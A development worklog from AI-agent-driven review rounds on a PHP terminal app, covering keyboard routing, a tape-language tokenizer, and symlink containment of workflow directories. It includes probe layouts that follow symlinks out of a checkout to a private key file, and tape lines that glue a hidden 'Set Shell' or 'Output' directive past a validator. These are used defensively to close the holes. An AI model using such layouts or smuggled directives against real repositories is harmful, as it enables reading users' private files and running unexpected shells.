fully green while `proj/sib.yaml -> ../projevil/x.yaml` becomes loadable; and the
signal-stack **balance** is unpinned (`WorkflowEngine.php:1611` — a non-popping
mutant passes all 47 engine tests by getting the end state right while leaking a
frame per run and running outer stages under the wrong disposition).

## Lane E — #38: review of the fix round found a HIGH in the *justification*

**F-A1 (HIGH).** Decision A's criterion has a second half — that `Ctrl+K` in
`Pane::Agents` gives a second door to the palette, so yielding chat-side `Ctrl+P`
would remove "one of two doors to the same room". Measured at 100×30, **the second
door opens onto nothing**:

| pane | Ctrl+K palette state | painted in `App::view()` | `Down` |
|---|---|---|---|
| `Pane::Chat` | OPEN | **YES** | reaches Chat/palette |
| `Pane::Agents` | OPEN | **NO** | **claimed by the shell** |

That is precisely the condition (overlay those views cover ∧ `↑/↓/Enter` those
views claim) the criterion's **first** half uses to disqualify `Ctrl+R`. So
`Ctrl+P` from the agents pane — or an open skill picker, or an open F10 menu —
opens an **invisible, undrivable** palette.

Two things held together honestly: the `Ctrl+P` routing is **unchanged from
`HEAD`** (`CHAT_CTRL_RUNES` already contained `p`), so this is not a regression the
fix introduced; what the fix introduced is a justification that is false when
measured. Applying its own criterion consistently would add `p`, which **collides
with `testChatOwnedChordsSurviveTheAgentsPane`** (`KeyboardHandlerTest:987`),
pinned as pre-existing and confirmed to pass for the right reason. That tension
should have been *named*, not resolved with an unmeasured fact.

**F-A2 (MEDIUM).** The `shellOwnsKeyboard($app)` conjunct in `chatOwns()`
(`KeyboardHandler.php:234-235`) is a **provable no-op**: yielding `r`
unconditionally survived mutation with `KeyboardHandlerTest` +
`KeyBindingDriftTest` at OK (132 tests, 730 assertions), and a 14-state routing
probe (7 panes × menu open/closed) produced **byte-identical** output. Cause:
`testTheTwoClaimSetsAreDisjoint()` guarantees no yielded rune is in
`shellCtrlRunes()`, so rule 6 can never claim `r`; and rule 2 already claims
*every* key in exactly the three states the conjunct tests. So the conjunct, the
new `$app` parameter, and the docblock's "Read twice" claim change nothing
observable.

**F-B1 (MEDIUM).** Decision B pins an **invisible, input-swallowing permission
prompt with no cue**. With `keyHelp=0` and a prompt pending: reference paints,
prompt does not, `y`/`n`/`a` all leave `perm=Y`, `Esc` recovers. The precedence
itself is right and pinned. What is wrong is pinning *absence with no cue* — the
same round added `KEY_HELP_TOO_SMALL` with the rationale "an open modal that is
invisible AND silent is a stuck terminal as far as the user can tell", and a
blocking prompt under the reference meets that definition exactly while forcing
`inFlight` true. Enabling gap: **`Chat::requestPermission()` applies the message
unconditionally and never checks `$msg->generation`** against `$this->generation`,
though the message carries one and `Chat.php:603` shows the codebase knows
superseded messages arrive late.

Nits: the coexistence sentence at `Renderer.php:899` is false (mouse zones stay
live under the overlay, so a status-bar click opens the palette with the reference
up); `Renderer.php:2318`'s claim that the *description* is dropped is **backwards**
and the line is untested; `KEY_HELP_CHROME_COLS`'s derivation is unverifiable as
written; the memo accounting is incomplete; `testNoDescriptionNamesAKeyOutsideTheOrForm()`'s
regex has holes no current row exploits; and **`CommandRegistry.php:108` registers
`keys` but not `help`** while `Chat::submit():3288` accepts `/help` and
`README.md:156` documents it — so `/help` works typed in full but never appears in
the `/` popup or the palette, in the very registry this plan item exists to make
authoritative.

**Confirmed sound and not to be re-litigated:** the 2/3/3b → `shellOwnsKeyboard()`
consolidation is *exactly* equivalent (four sequential `if`s over pure predicates
→ one short-circuiting `||` in the same order; dropping each clause individually
kills 11 / 3 / 7 tests); `chatOwns()` cannot see a null or stale `App`; the derived
set `['r']` is right against the criterion's first half for every chord (only `p`
also opens an overlay; `Ctrl+Tab`/`Ctrl+Shift+Tab` return above the yield check);
`handleCtrl()` has no undocumented *reachable* chord; the `$keyHelpMaxOffset`
ceiling is right in every ordering; F3/F4/F5/F6/F7/F9/F10/F11 all verified, with
**140 derived** as 14 widths ≥5 × 10 heights ≥5 and the floor confirmed
behaviourally exact at 648 sizes; each of the four `(or k / j)` rows now fails
**individually** when reverted, closing the original defect. TUI invariants
re-derived: 9,108 renders (plain/palette/perm × cols 1–130 × rows 1–45, top and
clamped-to-end) → 0 violations; 1,296 exhaustive renders (cols 1–72 × rows 1–9) →
0; floor provably exactly `cols≥5 ∧ rows≥5`; `cue ⟺ refuse ⟺ nobox` perfectly
correlated; frame height always `== rows`.

Memo timings re-measured on this host: **50.9 µs** cold vs **0.276 µs** memoised
(old host 94.7–117.4 / 0.517–0.655). The docblock says "~90µs **on this machine**"
— machine-scoped and therefore honest, but measured on the *dead* machine.

## Reviewer-technique notes that earned their keep this session

- **Predict your control file.** Lane D's reviewer chose
  `src/Permissions/ToolDeclaration.php` — created by its own lane, in a directory
  no other lane touches — and predicted it would not change. 22/22 hashes OK. Even
  better, **16 of them matched the pre-crash baseline byte-for-byte**, which
  independently confirmed by a second method that `src/Chat.php` carried no
  leftover sabotage mutation from the agent killed mid-mutation. Predicting the
  control is the strong part; a control you pick after the fact proves less.
- **A `trap restore EXIT INT TERM HUP` harness** with md5 + `cmp` change-guards, a
  unique-anchor assertion, in-memory originals, and a printed restore
  confirmation. Both reviewers used it; zero anchor misses, zero no-ops, zero
  restore mismatches across 26 + 8 mutations.
- **Register the sandbox autoloader AFTER Composer's `register(prepend: true)`**
  and assert `ReflectionClass::getFileName()` per class per mutation. Lane D's
  reviewer proved 10 classes resolved inside the sandbox before every one of 26
  rows.
- **Inheriting a predecessor's probe is legitimate when the bytes match.** Lane
  E's reviewer re-ran what it could and explicitly listed what it inherited on md5
  proof (its baseline hashes were identical to the bytes those probes ran on, so
  they transfer exactly) versus on trust (two mouse click-through observations).
  That three-way split — re-verified / inherited-on-proof / inherited-on-trust —
  is the honest form.

## Tracker items

Existing: **#78** `McpClientTest` `/bin/true` broken-pipe race. **#79**
`/workflow run` freezes the TUI (synchronous `run()` on the ReactPHP loop, up to
300s per stage). **#80** `ProcessExecutor::createInlineWorkerScript()` is still the
P1.S5 simulation — no provider request, so no tool call exists on the pool path
for a `PermissionGate` to evaluate, which is *why* threading the gate could not
alone make #13's claim true. **#81** port the vhs lexical grammar into
`candy-vcr/src/Tape/Lexer.php` (no JSON token, no regex token today). **#82**
`MenuBar.php:362-368` orphaned docblock — second instance, wants a grep not a
point fix.

New this session:

**#83** `README.md:42` advertises *"4,337 tests / 12,587 assertions"* against an
actual **6,246 / 38,073**. Pre-existing, untouched by any lane.

**#84** the containment-idiom hole is **systemic**: `SkillLoader::contained()`
(`:337-351`) and `README.md:305` carry the same property lane D's review found in
`WorkflowRegistry::containedIn()` — a boundary directory that is *itself* a
symlink moves with the link, so nothing is ever outside it. Fixing only the
workflow tier leaves the skills tier stating the same guarantee it cannot keep.

## State right now

**In flight (3 lanes, nothing committed beyond this worklog):**
- **Lane D / #13** — fix round for the 1 finding + 4 nits above. Must decide
  between closing the symlinked-directory hole here (and filing #84) or correcting
  both claims precisely and filing the systemic fix.
- **Lane E / #38** — fix round for F-A1/F-A2/F-B1/F-B2 + 5 nits. Must resolve
  F-A1 deliberately: either add `p` to the yielded set and confront the pinned
  test on its merits, or fix the premise and *name* the tension.
- **Lane B / #37** — round-12 review still running. Priority is the differential
  corpus's **domain**: what a 6×8×22×7×5 product cannot contain (nested
  constructs, two constructs on one line, `\r\n`, non-ASCII, three-line
  constructs, multiple sentinels, empty middles), since domain bugs are how this
  chain's sweeps failed twice. Its oracle paths on this host: binary at
  **`/tmp/vhsbin/vhs`**, Go source at
  `/home/my/go/pkg/mod/github.com/charmbracelet/vhs@v0.11.0`. No `ttyd`/`ffmpeg`,
  so `validate` and the parser only — no renders.

**Work order unchanged:** land #37/#13/#38 → #63 `enforceTimeLimit` → #12/#14/#17
rest of Phase 2 → #64 → the P3-P8 body → #58/#59/#60/#61, #49, #51, #55, and
#74-#84.

## Lane B — #37: round 12's finding, and the root cause of the whole twelve-round chain

Round 12 produced the twelfth consecutive finding, and its primary one is the
**third occurrence of a single failure mode**: the probe was correct and the
probe's *domain* was the bug.

**Findings 1 + 2 share one root cause.** `tokenize()`'s bare-token run (line 1465)
uses a **nine-byte negative break set**:

```php
$breaks = " \t" . $newlines . '#' . "\"'`" . '{';
```

Upstream uses two **positive byte classes**, read straight from `lexer/lexer.go`:

```go
func (l *Lexer) readIdentifier() string {   // 67 bytes
  for isLetter || isDot || isDash || isUnderscore || isSlash || isPercent || isDigit
func (l *Lexer) readNumber() string {       // 11 bytes: [0-9.]
  for isDigit || isDot
```

Everything outside those classes is either one of the nine single-byte tokens
(`@ = + - % ^ \ [ ]`) or `ILLEGAL` — **one token each**. Measured over all 255
bytes: the model is over-greedy on **179** for identifiers and **235** for
numbers, under-greedy on none.

**The damage is not value length — it is a lost occurrence.** The next directive's
*head* gets glued into the bare token, so `headMatches()`/`startsDirective()` never
see it. Nine end-to-end tapes, `validate` exit 0, suite GREEN:

| appended to `cli.tape` | upstream sees | model sees |
|---|---|---|
| `Set Padding }Set Shell "sh"` | `SET Padding }` + **`SET Shell sh`** | one token `}Set` |
| `Set Padding 0Set Shell "sh"` | + **`SET Shell sh`** | `0Set` |
| `Set Padding -Output evil.gif` | + **`OUTPUT evil.gif`** | `-Output` |
| `Set LoopOffset 50%Set Shell "sh"` | + **`SET Shell sh`** | `50%Set` |
| `Set Padding }Source real.tape` | + **`SOURCE`** | `}Source` |
| control `Set Padding } Set Shell "sh"` | same | sees it → RED ✓ |

Exploitable glue set: **64 bytes**, identical for both sentinels —
`\x01-\x08 \x0b \x0c \x0e-\x1f ! $ % & ( ) * + , - 0-9 : ; < = > ? @ [ \ ] ^ _ | } ~ \x7f`.

Finding 2 is the same bug wearing a different hat: `panicsUpstreamsLexer()` has
**220 false negatives / 0 false positives** over a 1,944-case sweep, because the
model glues `/` into a bare word (`Set Padding 50/a\` and `Type "x"\na\/b\` are one
token each) so no regex opens and `$regexPanic` never sets — while upstream's
`readNumber` stops at `/`, `readIdentifier` never starts on `\`, and `readRegex`
walks off the end (`slice bounds out of range`, exit 2).
`testTheRegexPanicDetectorMatchesTheMeasuredShapes()` cannot catch it: all three of
its shapes are `Set WaitPattern /…`, i.e. `/` already at a token start after
whitespace. Same domain narrowness.

**The fix is structural — model tokens POSITIVELY, mirroring upstream's byte
classes, instead of negatively with a break set.** A negative set can never be
shown complete; a positive class transcribed from `lexer.go` can. Round 12
confirmed a corrected model drives adjacency misses to **0** and the panic detector
to **FN=0, FP=0**. That is round 13's job, now in flight.

**Finding 3 — round 11's own mutation claim does not hold for the list in the
tree.** Round 12's 112-mutation sweep: **101 RED, 7 SURVIVED, 3 HANG, 1 NO-OP**.
Six survivors re-verified individually (bytes changed, suite still `OK (69/261)`),
and **four appear verbatim in round 11's list** that reported "80 RED / 1 NO-OP / 0
survived": JSON `'quoted' => true→false` (breaks "a JSON token can never be a
directive head"), dropping the string's `$close < $lineEnd` bound (breaks
newline-bounding), `++$i` before `$values[]` (breaks the file's own *"stepping over
it would lose that occurrence"*), and `head()` → `return $text` (breaks
`Type@100ms` ending a value). Plus `GRID_COLUMNS` and one grid row asserted
nowhere. The 3 HANGs are infinite loops from mutations that desynchronise
`$breaks` from the delimiter branches — a mutation artifact, and possibly removed
outright by the positive-class rewrite.

**Finding 4 — fifth instance of the unmeasured-comment class.** Lines 103–105 cite
`Home` as *"a token TYPE and a `parseCommand` case"*. The load-bearing half is
true (token type at `token.go:52`, no `Keywords` key, `Type Home zzqq` really types
`Home zzqq`), but `HOME` lives in **`token.IsCommand()`** (`token.go:193`) and the
string does not occur in the parser at all — `parseCommand()` (`parser.go:138`) has
no `token.HOME` case.

**Three claims corrected as a result**, all of them *measured* claims: line 1242's
"0 miss-direction divergences" (really 150 in an adjacency sweep, +6 with two
sentinels on a line — the corpus was not wrong *for its domain*, because a
6×8×22×7×5 product always separates sentinel from value by whitespace or by a
delimiter *closer*, and a closer is either in `$breaks` or handled by
`scanRegex()`); lines 1169–1180's claim that the model only ever gives a value
*more* tokens (it also yields *fewer occurrences*, which line 1232 itself names as
"a false green of exactly the kind this file exists to prevent"); and the class
docblock's "look first at the `#`-hiding set", which is complete by construction
and therefore would send round 13 to the wrong place.

Round 12's nine-family domain sweep, worth keeping because it shows what *did*
hold: nested constructs 0 miss, two-constructs-per-line 0, CRLF 0, non-ASCII 0,
three-line constructs 0, empty middles 0, closer-then-glued-sentinel 0 — only
**adjacency (150)** and **multiple sentinels (6)** miss.

**Claims that survived round 12 intact:** JSON asymmetry (`a{#}b` → three tokens;
`{abc\nSet Shell "sh"` runs to EOF as one JSON token with 0 errors; `{ab\n` gets
its closer appended); `scanRegex()` as a faithful `readRegex` port line-by-line;
comment-valued `Set` genuinely loud for every family (`Type #php …` is green but
`parseType` *gates* on `token.STRING`, so upstream rejects it — not a clean-parse
tape, so not a false green); **KEYWORDS by construction** — `token.Keywords` 60/60
unique, PHP const 60/60, **set-equal**, and `LookupIdentifier`'s body is the whole
mechanism; claim 6's durable half; claim 7's probe-shape soundness.

**The "24" adjudication, settled:** no candidate equals 24. Across the five tapes
with `errors=0` — **13** distinct directive kinds, **52** (tape, directive) pairs,
**74** total occurrences, **25** `Set`-occurrences, **9** kinds counting bare `Set`
once, **16** distinct KEYWORDS in the token streams. Round 11 was right to report
what it measured.

**Every candy-vcr statement verified accurate in source, nothing weakened:**
`Tape/Compiler.php:296` records the shell name; `Encode/TapeToGif.php:364`
`resolveShell()` prefers `$options['shell']` then `$this->compiler->shell()`;
`Render/FrameStream.php` runs exec mode under a real PTY (`PtySystemFactory`) with
`shellCommand()` doing `locateShell($shell) ?? self::FALLBACK_SHELL` (`/bin/sh`);
**no shell whitelist anywhere in `candy-vcr/src/`**, so `Set Shell "sh"` is legal
there; `Tape/Lexer.php` is `explode("\n", …)` + per-line regex with no JSON and no
REGEX token. Both `UPSTREAM-ONLY` labels are additive prose above live assertions.

### The durable lesson, now three times over

**A negative set cannot be shown complete; a positive class transcribed from the
source can.** Every one of this chain's twelve findings was the model describing
what *stops* a token instead of what *continues* one, and each round closed one
more stopping-byte while the next stayed open. The same asymmetry explains the two
earlier domain failures: round 9's `#`-protection sweep used one character as both
opener and closer (so `{a#b{` had no `}` and `{` scored as "does not protect"), and
its keyword sweep generated only CamelCase words (a domain that structurally
cannot contain `em`/`px`/`ms`). In all three the probe was right.

Corollary that is now a standing rule for this file: **when you restate a measured
figure, restate the domain it was measured over.** Round 12's finding exists
because "0 miss-direction divergences" travelled without its corpus.


---

## Lane D (#13) — round-3 fix landed; round-4 review in flight

The fix agent closed all five round-3 findings and, on the one that mattered, took
the harder of the two options offered.

### Finding 1 — the symlinked-boundary escape, closed with a trust anchor

`containedIn()` resolves both sides of the comparison, so a boundary directory that
is *itself* a symlink moves with the link and the check passes by construction. The
exposure is reachable from a plain `git clone`: git stores `.sugar-crush/workflows`
as a symlink happily, and `Bootstrap::workflowEngine()` builds exactly that path.
The option to merely re-word the guarantee was rejected — it would have left a live
escape behind a more careful sentence.

What made a complete close look expensive earlier was that the registry had no
trust anchor to compare against. It turned out to be one constructor argument:
`Bootstrap` already holds `$root`, and `$root` is the one path in the pair a
repository cannot forge, since a link that moved it would have to sit *above* the
checkout.

- New third param `?string $projectRoot = null`; `Bootstrap` passes `projectRoot: $root`.
- New `readableProjectDir(): ?string` — the project workflows **directory** must
  resolve inside the anchor (`$projectRoot`, else the directory's own parent).
- Refusal **drops the tier** rather than emptying it, so a collided user-home
  directory falls through to the user tier's unconfined reading instead of
  vanishing from both.
- Both project read paths gated identically: `yamlDirectories()` **and**
  `projectYamlPath()` — the latter is `load()`'s project-first fast path, the one
  place that bypasses the map.
- A dangling directory link stays readable: nothing is behind it, and keeping it
  preserves `loadYaml()`'s not-found message for a fresh checkout.
- Docblocks and the README Workflows bullet now state **two** boundaries and name
  the weaker fallback's exact limit (`.sugar-crush -> /elsewhere` is not caught
  without a root). `containedIn()`'s `SkillLoader` cross-reference now says the
  resemblance stops at the prefix idiom and that the skills side is **not** closed.

Six layouts probed against the final code — plain link out, relative chain
`a→b→../secret/id_rsa`, symlinked **sub**directory, dangling link, sibling-prefix
`proj → ../projevil/x.yaml`, and a TOCTOU swap between `list()` and `load()` — all
refused, none leaking the sentinel. The user tier still follows its own link out
(deliberate), the legit project entry still loads, and a new in-checkout control
(`.sugar-crush/workflows -> tools/workflows`) still loads.

**The admitted weakness, reported rather than buried:** the wiring test's first form
did not bite. A link *out of the checkout* is also out of the `dirname()` fallback
anchor, so mutating `projectRoot: $root` → `null` left it green. The agent said so
in that test's own docblock and added
`testAnInCheckoutSymlinkedWorkflowsDirectoryIsStillHonouredByTheLaunch` — the only
layout that separates the two anchors — where the mutation now goes RED.

### Findings 2–5

- **2, fixed not documented.** The duplicate-stage-name load error now reports
  `(stages #0 and #2)` instead of echoing the name; `$seenStageNames` stores the
  first index. A duplicate name is by definition written twice, so the indices say
  where both are — strictly more useful, and the content-echo exception disappears.
- **3, pinned.** Reflection on **`decide()`** rather than the private method, so the
  `commitAutoStrikes: false` routing is pinned alongside the fail-closed branch.
- **4, tested.** `testASiblingDirectorySharingTheProjectDirsNameIsNotContained`
  covers the previously load-bearing, untested trailing-separator guard.
- **5, pinned.** `assertSignalHandlerStackEmpty()` plus a test covering four exits:
  plain run, two separate engines, an exception past every stage-level `catch`, and
  a pre-flight refusal.

Every fix carries its own sabotage, each judged by the targeted test file flipping
green→red — not by suite totals, which moved under the agent three times
(6252 → 6261 → 6293) as concurrent lanes added tests.

### Divergences the fix agent reported against its own brief

1. **`ext-gd` IS loaded on this host.** The brief's stated baseline (5 errors, 1
   failure, 27 skips) does not reproduce; measured **0 errors / 0 failures / 1
   skip**, and that skip is exactly the one legitimate `McpClientTest` case. The
   test *count* matches, which confirms the extra assertions are previously
   skipped/errored tests now running to completion.
2. **`README.md:42` is not the test-count line** — tracker #83 was wrong. The stale
   counts live at **`README.md:377`** (*"4,337 tests / 12,587 assertions"* against
   an actual 6,293 / 38,319); `:42` is the EchoProvider quickstart. Left unfixed
   deliberately: the number is unstable while other lanes are live.
3. **Two test-helper `removeDirectory()` methods followed symlinked directories** —
   `is_dir()` answers true *through* a link, so a teardown would have emptied a
   link's target rather than removing the link. Given an `is_link()`-first branch in
   `WorkflowRegistryTest` and `FeatWiringReachabilityTest`. Required by the new
   fixtures; a latent hazard regardless.

**Numbers, with domains.** Lane suites (`tests/Workflows` + `tests/Permissions`):
347/823 → **353/848** (+6: 4 registry, 1 engine, 1 permissions).
`tests/Integration` + `tests/Cli`: 799/3636 → **801/3642** (+2 wiring).
Full suite: **6293 tests / 38319 assertions / 1 skipped / 0 errors / 0 failures**.

### Tracker updates

- **#83 corrected** — stale test counts are at `README.md:377`, not `:42`.
- **#84 confirmed and sharpened** — `SkillLoader::contained()` carries the identical
  symlinked-directory escape with a *larger* payload (`SKILL.md` bodies enter the
  prompt) and the same absolute claim at `README.md:305` ("a repo cannot ship a link
  that reads your files"). `src/Skills/` is out of lane D. The workflow-side code and
  README now say explicitly that the skills half is open and tracked, so the repo no
  longer asserts a guarantee it lacks — but this needs the same anchor treatment,
  ideally via one shared predicate.

Round-4 review is in flight, briefed to attack the anchor's forgeability (including
the common case of a checkout reached *through* a symlink, where over-refusal would
be its own regression), the new tier-drop as a possible name-shadowing vector, and
`list()`/`load()` gate consistency.

---

## Lane B (#37) — round-13 rewrite landed; round-14 review in flight

The structural fix. `tokenize()` no longer has a `$breaks` set at all; it transcribes
upstream's `NextToken` switch arm for arm, in upstream's order, with two **positive**
run classes and explicit entry tests:

- `SINGLE_BYTE_TOKENS = '@=][-%^\+'` — the nine `case` arms, tried **before** either
  reader. This is what makes `-` and `%` single tokens at a token *start* while
  remaining identifier bytes mid-run.
- `NUMBER_BYTES = DIGIT_BYTES . '.'` (11) — `isDigit || isDot`.
- `IDENT_BYTES = LETTER_BYTES . DIGIT_BYTES . '.-_/%'` (67) — the seven `is*` predicates.
- Entry: digit, or `.` whose next byte is a digit → number; letter or any other `.` →
  identifier; everything else → one-byte ILLEGAL.

Tokens now carry `'kind' => ident|number|string|json|regex|single|illegal` instead of
`'quoted' => bool`, and `startsDirective()`/`headMatches()` gate **positively** on
`ident`. That is upstream's own rule — `readIdentifier` is the only reader whose
result reaches `LookupIdentifier` — rather than a list of exceptions, which is what
every prior round had been extending.

`head()`'s `@`/`+` text-stripping became dead by construction (both bytes are
single-byte tokens, so runs already end there) and was replaced by
`skipSpeedSuffix()`, porting `parseSpeed`/`parseTime` onto the token walk: the same
knowledge, moved to where upstream keeps it.

### The six re-run checks, before → after

| check | before | after |
|---|---|---|
| 255-byte identifier differential | over-greedy **179**, under 0 | **0 / 0** |
| 255-byte number differential | over-greedy **235**, under 0 | **0 / 0** |
| nine glue tapes on `cli.tape` | 8 GREEN + control RED | **all 9 RED**, `validate` exit 0 on all 9 |
| 1,944-case panic sweep | 352 panics, flagged 294, **FN=58** FP=0 | **FN=0 FP=0** (352/352) |
| nine-family sweep (998 clean) | **627 MISS** / 0 EXTRA (adjacency 604 + multi-sentinel 23) | **0 MISS / 0 EXTRA**, all nine families |
| five-tape parser differential | 0 errors; 13/52/74/25/9/16; 0 miss | **identical**, still 0 miss |

Tests 69 → **99**, assertions 261 → **402**. 16 mutations run: **16 RED, 0 survived,
0 hangs.** The three HANG mutations are now *impossible*, not merely fixed: the hang
was `strcspn($source, $breaks, $i)` returning 0 when `$source[$i]` was itself a break
byte, reachable by disabling any delimiter arm while its opener stayed in the set.
With no break set and a one-byte ILLEGAL fall-through, no arm can emit a zero-width
token — re-measured by disabling five separate arms, all fail in seconds.

### Claims corrected in the file itself

The class docblock no longer points the next reader at the `#`-hiding set as "the one
place to look first" — it names **both** halves of the miss surface and says outright
that the first half's completeness-by-construction was repeatedly misread as covering
the second. The "coarseness is free" sentence is gone, with a note on why a
true-but-reassuring framing kept twelve rounds of readers on the wrong half. A new
paragraph bounds the "more tokens, never fewer" argument: it is about which *token*
ends a value and it holds, but it says nothing about where each token *ends*, which is
where the miss actually lived. The `Home`/`KEYWORDS` citation is fixed — `HOME` is a
token type (`token.go:52`) appearing in `token.IsCommand()` (`token.go:193`); the
string does not occur in `parser.go` and `parseCommand` has no `token.HOME` case,
while `record.go:30` maps `\x1b[1~` → `token.HOME` in the opposite direction.

### Divergences the fix agent surfaced against its own brief

1. **One glue tape in the brief was not a clean-parse tape.** `Set Padding %Output
   /etc/x.gif` puts `/etc/` at a token start, which opens a REGEX — upstream reports
   3 errors and `validate` exits 1, so it cannot be a false green. Replaced with
   `Set Padding %Output etc/x.gif` (0 errors), which makes the same `%`-glue point.
2. **`Set Padding }Source real.tape`** is zero-error only with a `real.tape` beside it,
   since `parseSource` stats the path. Noted in the row.
3. **The sweep generators were reconstructed, and are weaker than round 12's.** Round
   12's exact case lists were not in the tree. Rebuilt to the stated dimensions they
   give 352 panics / **FN=58** (round 12: 360 / FN=220) and 998 clean / 627 misses
   (round 12: 299+22 / 150+6). Same shape, same two failing families — but a corpus
   that exposed the old bug several times *less* strongly proves correspondingly less
   about the fix. Round 14 is briefed to build an independent third corpus rather than
   accept either.
4. **`Set TypingSpeed 40ms` now yields value `40`, not `40ms`** (upstream re-joins the
   unit in `parseSet`; this model stops at the `ms` keyword). Same for
   `Set LoopOffset 50%` → `50 %`. Value-text-only and in the loud direction, and the
   agent reports no assertion queries it — flagged for round 14 to confirm, since a
   silent lossy divergence is exactly the sort of thing a later round rediscovers.
5. **A residual counted separately rather than swept under "0":** 128+128 cases where
   upstream's literal differs by text only, because `newToken` does `string(ch)` on a
   **byte** — an integer→string conversion, so an ILLEGAL byte ≥ 0x80 comes back
   UTF-8 re-encoded. Claimed boundary-neutral; round 14 will test that claim.

### Why round 14 exists

`skipSpeedSuffix()` is **new speculative code with zero review rounds**, and the
"0 FN / 0 MISS" figures rest on a reconstructed corpus measurably weaker than the one
that found the bug. Both are briefed as primary targets, alongside an exhaustive
256-byte enumeration of the glue class (the nine tapes are a sample; the byte space is
small enough to enumerate) and a check that `SINGLE_BYTE_TOKENS` is never interpolated
into a regex character class, where `[-%` would form a reversed range.

---

## Lane E (#38) — fix round landed; review in flight

All four findings and five nits closed. Two of the four were resolved by *measuring
the alternative* rather than by applying the obvious remedy, and in both cases the
measurement is what justified keeping the current behaviour.

### F-A1 — the criterion had two conditions, not one

The old docblock justified leaving `Ctrl+P` unyielded on a premise the previous review
measured false. The fix agent re-drove the table, confirmed it, then measured the thing
the review had not: **what the shell would actually do with a yielded `Ctrl+P`.**

| state | shell `handle()` | result |
|---|---|---|
| `ctrl+p` in `Agents` | `ProviderSelectCmd` | `consumeShellCmd` → palette mode=providers |
| `ctrl+p` in `SkillPicker` | `ProviderSelectCmd` | same |
| `ctrl+p` in `MenuOpen` | `ProviderSelectCmd` | same |
| `ctrl+r` in all three | `null` | default arm no-op |

So yielding `p` does **not** swallow the chord the way yielding `r` does — it rebinds
`Ctrl+P` to `/model`, opening a *providers* palette that in `Pane::Agents` is exactly
as unpaintable as the command palette it replaced. `Ctrl+R` is yieldable only because
`handleCtrl('r')` has no arm. The criterion therefore has two conditions: `Ctrl+P`
meets the first and fails the second. That is now what the docblock says, and it is
**enforceable rather than prose** — `testEveryYieldedChordIsAnsweredByANoOp()` drives
every rune of the derived set through all three states and requires `[$app unchanged,
null]`.

The previous review's routing table was corrected in one place: `Pane::Agents` palette
is invisible **and** undrivable; the skill-picker and menu states paint the palette but
still route `Down` to the picker/menu.

`testChatOwnedChordsSurviveTheAgentsPane` survives, and correctly — it pins "the shell
does not steal a live Chat chord", not "an invisible palette is good", and the measured
alternative is worse rather than better. Sabotage S1 (adding `yieldsToShellReason` to
`chat.palette`) turns **4** tests red, so the collision is real and documented rather
than hidden. The residual gap is named in the docblock under a
`── the gap this leaves open (tracker #85) ──` heading with all three measured states,
and `testTheAgentViewTakesAPaletteItNeitherPaintsNorDrives()` pins current behaviour so
that the day it is fixed, a test says so.

### F-A2 — dormant guard documented, not deleted and not faked

The provably-unobservable conjunct was neither removed nor given an artificial effect
(any such change is a routing change with no user benefit). `shellOwnsKeyboard()`'s
docblock now states plainly that the second read is unobservable, names **both**
overlapping guarantees that make it so, and states what it protects against: rule 2
narrowing, which would otherwise leak the yield into every ordinary pane and kill
`Ctrl+R`. Pinned by `testChatOwnsYieldsTheChordOnlyWhileTheShellOwnsTheKeyboard()`
via reflection on private `chatOwns()`. Sabotage S2 → **exactly 1 failure, that test**,
proving both that it bites and that it is the only detector.

### F-B1 — the cue, plus the gap that made it necessary

- **Generation check:** `Chat::requestPermission()` now drops a stamped ASK whose
  generation is not current. **Unstamped still applies** — every internal caller relies
  on that. Sabotage S4 → `testASupersededAskNeverPutsUpAPrompt` red.
- **Cue:** new `Renderer::KEY_HELP_OVER_PROMPT = 'keys: ? closes · permission waiting'`,
  a whole-bar replacement following the `KEY_HELP_TOO_SMALL` precedent. The floor of the
  bar it replaces while a prompt pends was measured at **36 columns**
  (`0% · ⠴ thinking… · Esc Esc to cancel`) against the cue's **35**, and the bound is
  asserted at 5 sizes so the never-truncated invariant cannot rot.
- `Chat.php`'s own "It cannot collide with the permission prompt" comment was the same
  defect class; corrected to state what remains reachable (an unstamped ASK) and that
  the pair is ordered *and announced* rather than assumed away.

### F-B2 — false sentence replaced with an enumeration

Measured: with the reference open the box never reaches the last two rows, so the status
bar's `pane:menu` zone stays live at col 43 row 30 — clicking it opens the palette with
`keyHelp` still `0`, and the reference keeps both slot and keyboard. The comment now
enumerates each reachable pair. New
`testAMouseOpenedPaletteDoesNotTakeTheSlotFromTheReference()`; S11 (palette first in the
chain) → red, catching a reorder the existing precedence test does not.

### Nits

- **N1** comment was inverted. Fixed to measured behaviour (`E` / `E S` / `En S` at cols
  5/7/8), and the counterfactual measured too: `Style::width()` **truncates**, so
  dropping the cap loses the description entirely rather than wrapping. Behaviour kept,
  reason stated, tested.
- **N2** `KEY_HELP_CHROME_COLS` made checkable — box width `=== min(64, cols-chrome) +
  chrome` at 6 widths.
- **N3** accounting rewritten off the call sites: up to **three** lookups per keystroke,
  and the uncounted one was the yielded set, walking `all()` on every call at ~23.8 µs.
  Now memoised — 2 cold rebuilds **49.0 µs** vs 2 memoised **0.294 µs** (~166×,
  machine-scoped), pinned by `testEveryDerivedSetTheHotPathReadsIsMemoised()`.
- **N4** regex tightened (case-insensitive, `Ctrl-C`/`^C`, `Escape`, `Return`, `Home`,
  `End`, `Page Up`, `F\d{1,2}`): 8 previously-missed spellings caught, **0** false
  positives across all 57 rows. Two remaining holes documented with reasons —
  `Delete`/`Insert` are the verbs three live rows use, and a bare letter is
  indistinguishable from prose.
- **N5** `/help` registered as its own row (no alias field exists), with a comment on why.

### Verification

11 mutations, **all 11 bit**, all restored with md5 match, post-restore sweep green.
Every mutation ran in a **full sandbox copy** of the lib — vendor copied,
`vendor/sugarcraft/*` symlinks re-pointed at absolute real paths, and
`ReflectionClass::getFileName()` asserted inside the sandbox for all five mutated
classes and the test classes. The shared working tree was never mutated, because two
sibling lanes were running suites in it. Lane-only 171/7749 → **181/7826**. Full suite
**6294 / 38324 / 1 skipped / 0 failures / 0 errors**.

### Two false claims found in the code, neither in the brief

`KeyboardHandler`'s `p` bullet asserted "`ProviderSelectCmd` is inert" — measured live,
it routes to `/model`. That correction is also what supplies F-A1's real justification.
The `a` bullet's reachability wording and `Chat.php`'s "cannot collide" comment were the
same class. Every one of these is a sentence that was never measured; the pattern is now
three-for-three across lanes B, D and E in the same round.

### Tracker

- **#85** — `Ctrl+P` (and `Ctrl+K`, which translates to it) opens a hosted-Chat palette
  the shell's full-pane agent dashboard never paints and never drives; visible-but-
  undrivable in the skill-picker and F10-menu states. Wants the shell to composite, or
  to stand down for a hosted overlay. Yielding the chord makes it *worse*
  (`ProviderSelectCmd` → `/model`). `Tui\Renderer::renderAgentDashboard()` never renders
  the hosted chat at all — verified.
